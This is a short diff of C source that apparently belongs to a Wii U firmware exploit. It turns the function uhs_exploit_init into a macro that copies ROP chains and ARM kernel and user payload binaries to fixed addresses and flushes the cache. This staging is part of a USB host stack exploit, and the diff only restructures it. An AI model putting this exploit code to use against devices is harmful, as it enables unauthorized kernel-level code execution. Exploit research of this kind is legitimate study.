@@ -322,29 +322,27 @@ static const int second_chain[] = {
 
 static uint8_t otp_common_key[16] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
 
-static inline void uhs_exploit_init()
-{
-	ayylmao[5] = 1;
-	ayylmao[8] = 0x500000;
-
-	// Write data into PPC cache
-	pretend_root_hub[33] = 0x500000;
-	pretend_root_hub[78] = 0;
-	OSBlockMove(ADDY_SC, second_chain, sizeof(second_chain), false);
-	OSBlockMove(ADDY_FC, final_chain, sizeof(final_chain), false);
-	OSBlockMove(ADDY_AK, arm_kernel_bin, sizeof(arm_kernel_bin), false);
-	OSBlockMove(ADDY_AU, arm_user_bin, sizeof(arm_user_bin), false);
-
-	// Push data out of PPC cache to RAM
-	DCFlushRange(ayylmao + 5, 4);
-	DCFlushRange(ayylmao + 8, 4);
-	DCFlushRange(pretend_root_hub + 33, 4);
-	DCFlushRange(pretend_root_hub + 78, 4);
-	DCFlushRange(ADDY_SC, sizeof(second_chain));
-	DCFlushRange(ADDY_FC, sizeof(final_chain));
-	DCFlushRange(ADDY_AK, sizeof(arm_kernel_bin));
+#define uhs_exploit_init()													\
+	ayylmao[5] = 1;															\
+	ayylmao[8] = 0x500000;													\
+																			\
+	/* Write data into PPC cache */											\
+	pretend_root_hub[33] = 0x500000;										\
+	pretend_root_hub[78] = 0;												\
+	OSBlockMove(ADDY_SC, second_chain, sizeof(second_chain), false);		\
+	OSBlockMove(ADDY_FC, final_chain, sizeof(final_chain), false);			\
+	OSBlockMove(ADDY_AK, arm_kernel_bin, sizeof(arm_kernel_bin), false);	\
+	OSBlockMove(ADDY_AU, arm_user_bin, sizeof(arm_user_bin), false);		\
+																			\
+	/* Push data out of PPC cache to RAM */									\
+	DCFlushRange(ayylmao + 5, 4);											\
+	DCFlushRange(ayylmao + 8, 4);											\
+	DCFlushRange(pretend_root_hub + 33, 4);									\
+	DCFlushRange(pretend_root_hub + 78, 4);									\
+	DCFlushRange(ADDY_SC, sizeof(second_chain));							\
+	DCFlushRange(ADDY_FC, sizeof(final_chain));								\
+	DCFlushRange(ADDY_AK, sizeof(arm_kernel_bin));							\
 	DCFlushRange(ADDY_AU, sizeof(arm_user_bin));
-}
 
 #define uhs_write32(buffer, arm_addr, val, uhs) \
 	ayylmao[520] = arm_addr - 24;				\
